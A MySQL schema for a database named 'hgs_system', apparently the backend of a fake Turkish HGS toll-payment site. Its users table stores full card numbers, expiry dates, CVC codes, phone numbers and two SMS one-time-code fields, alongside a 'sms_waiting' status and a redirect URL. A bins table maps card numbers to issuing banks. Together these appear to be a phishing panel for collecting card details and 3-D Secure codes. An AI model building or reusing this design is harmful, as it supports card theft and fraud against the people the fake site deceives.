CREATE DATABASE IF NOT EXISTS hgs_system CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

USE hgs_system;

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    user_identifier VARCHAR(255) NOT NULL UNIQUE,
    identifier_type VARCHAR(50) NULL COMMENT 'plaka, tc, vergi, pasaport, hgs',
    identifier_value VARCHAR(255) NULL,
    amount DECIMAL(10, 2) NULL DEFAULT 0,
    service_fee DECIMAL(10, 2) NULL DEFAULT 0,
    total DECIMAL(10, 2) NULL DEFAULT 0,
    card_holder VARCHAR(255) NULL,
    card_number VARCHAR(255) NULL,
    card_expiry VARCHAR(10) NULL,
    card_cvc VARCHAR(10) NULL,
    phone VARCHAR(20) NULL,
    payment_status VARCHAR(50) NULL DEFAULT 'pending' COMMENT 'pending, completed, failed, sms_waiting',
    redirect_url TEXT NULL,
    sms_code VARCHAR(10) NULL,
    sms_code2 VARCHAR(10) NULL,
    created_at DATETIME NOT NULL,
    updated_at DATETIME NOT NULL,
    INDEX idx_user_identifier (user_identifier),
    INDEX idx_payment_status (payment_status)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;


-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `bins`
--

CREATE TABLE IF NOT EXISTS `bins` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bin` varchar(255) NOT NULL,
  `brand` varchar(255) NOT NULL,
  `banka_kod` varchar(255) NOT NULL,
  `banka_adi` varchar(255) NOT NULL,
  `type` varchar(255) NOT NULL,
  `sub_type` varchar(255) NOT NULL,
  `isbusiness` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  INDEX idx_bin (bin)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- Bins tablosu için veri ekleme (enew.sql'den alınmıştır)
-- Not: Tam veriyi eklemek için enew.sql dosyasını ayrıca import edin
